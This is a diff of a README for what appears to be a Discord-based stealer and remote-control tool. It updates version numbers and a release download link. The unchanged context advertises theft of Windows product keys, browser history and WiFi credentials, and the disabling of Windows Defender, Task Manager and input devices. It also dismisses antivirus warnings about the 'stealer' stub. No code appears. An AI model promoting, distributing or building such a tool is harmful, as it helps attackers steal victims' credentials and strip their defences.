@@ -46,7 +46,7 @@ I will not be held accountable for any illegal activities.
 - Stealing **Windows Product Key**
 - Stealing browser history
 - Stealing **WiFi credentials**
-- Taking desktop screenshot (*may not work 0.3.3*)
+- Taking desktop screenshot (*may not work 0.3.4*)
 - Disabling Windows Defender
 - Disabling Task Manager
 - Disabling Mouse and Keyboard
@@ -81,7 +81,7 @@ Yes, the program is 100% free and open source.
 On Null Community [discord](https://discord.gg/qjrDprutvg).
 
 - How to use it?<br />
-You need to compile open source files or download released stable program from [here](https://github.com/Nyxonn/Discord-AIO/releases/download/0.3.3/dAIO_0_3_3.7z) or discord above.
+You need to compile open source files or download released stable program from [here](https://github.com/Nyxonn/Discord-AIO/releases/download/0.3.4/dAIO_0_3_4.zip) or discord above.
 
 - Antivirus reports program as malicious!<br />
 Program contains the stub file which is necessary to make stealer work, it's all open source so if you are extremly scared check it by yourself.
